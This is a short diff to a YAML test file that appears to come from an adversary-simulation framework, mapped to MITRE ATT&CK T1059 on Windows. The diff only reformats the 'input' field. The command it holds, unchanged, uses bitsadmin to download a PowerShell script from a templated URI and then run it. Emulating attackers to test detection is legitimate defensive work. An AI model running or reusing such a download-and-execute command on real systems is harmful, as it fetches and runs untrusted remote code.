@@ -9,7 +9,8 @@ mitre_technique:
   id: T1059
   platform: Windows
 commands:
-- input: bitsadmin.exe /transfer metta /Download /priority high {{ bitsadmin_download_uri }}
-    C:\Tools\Default_File_Path.ps1;  powershell C:\Tools\Default_File_Path.ps1
+- input:
+    command: bitsadmin.exe /transfer metta /Download /priority high {{ bitsadmin_download_uri }}
+      C:\Tools\Default_File_Path.ps1;  powershell C:\Tools\Default_File_Path.ps1
   sleep: 1
   module: exec_shell
